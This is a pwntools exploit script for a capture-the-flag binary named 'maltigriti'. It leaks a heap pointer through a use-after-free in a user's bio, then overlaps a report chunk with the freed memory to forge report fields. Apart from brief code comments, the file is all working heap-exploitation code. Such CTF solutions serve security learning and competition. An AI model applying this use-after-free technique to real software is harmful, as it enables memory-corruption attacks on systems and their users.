#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./maltigriti", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc maltigriti.ctf.intigriti.io 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def logout():
    io.sendlineafter(b"menu> ", b"6")


def register(name, password, bio, bio_len):
    io.sendlineafter(b"menu> ", b"0")
    io.sendlineafter(b"name> ", name)
    io.sendlineafter(b"password> ", password)
    # TODO: bio length is not ask anymore when registerting for 2nd time
    io.sendlineafter(b"long is your bio> ", str(bio_len).encode())
    io.sendlineafter(b"new bio> ", bio)


def edit_user(bio):
    io.sendlineafter(b"menu> ", b"1")
    io.recvuntil(b"current bio is: ")
    leak = io.recvline(keepends=False)
    io.sendlineafter(b"new bio> ", bio)
    return leak


def new_report(title, content):
    io.sendlineafter(b"menu> ", b"2")
    io.sendlineafter(b"title> ", title)
    io.sendlineafter(b"report> ", content)


env = {}
io = start()

register(b"name", b"password", b"biobio", 0xc0)
new_report(b"title", b"content")
logout()
heap_leak = u64(edit_user(b"a" * 32).ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")
print(heap_leak)
user_addr = (heap_leak << 12) + 0x2a0

# Overlap report chunk with UAF bio chunk
new_report(b"title", b"content")
# register(b"foo", b"bar", b"baz", 0x80)
payload = flat(
    user_addr,
    b"A".ljust(8, b"\x00"),
    p64(1337),
    b"title"
)
edit_user(payload)
io.sendlineafter(b"menu> ", b"5")

io.interactive()
